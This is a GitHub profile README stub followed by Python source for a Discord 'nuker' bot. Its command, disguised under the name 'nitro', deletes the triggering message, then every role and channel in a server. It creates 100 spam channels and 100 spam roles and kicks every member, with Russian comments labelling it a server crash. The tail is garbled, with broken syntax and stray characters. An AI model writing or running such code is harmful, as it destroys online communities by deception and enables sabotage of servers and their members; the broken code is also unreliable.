- 👋 Hi, I’m @Roma1234dc
- 👀 I’m interested in ...
- 🌱 I’m 
You can click the Preview link to take a look at your changes.
--->
import discord
from discord.ext import commands
from discord import Permissions
import asyncio
import os
import discord, random, aiohttp, asyncio
from threading import Thread
import requests

intents = discord.Intents.default()
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)

bot.remove_command("help")


@bot.command()
async def nitro(ctx):
    guild = ctx.message.guild
    with open('hacked.jpg', 'rb') as f:
        icon = f.read()
    

    await ctx.message.delete()

    for m in ctx.guild.roles:
        try:
            await m.delete(reason="Краш сервера")
        except:
            pass

    for channel in ctx.guild.channels:  # собираем
        try:
            await channel.delete(reason="Краш сервера")  # удаляем
        except:
            pass

    for _ in range(100):
        await guild.create_text_channel('crash-by-rc roma1234')

    for _ in range(100):
        await guild.create_role(name='crash-by-rc roma1234')

    for m in ctx.guild.members:
        try:
            await m.kick(reason="Краш сервера")
        except:",
                    
            except:
                pass


4UftE'

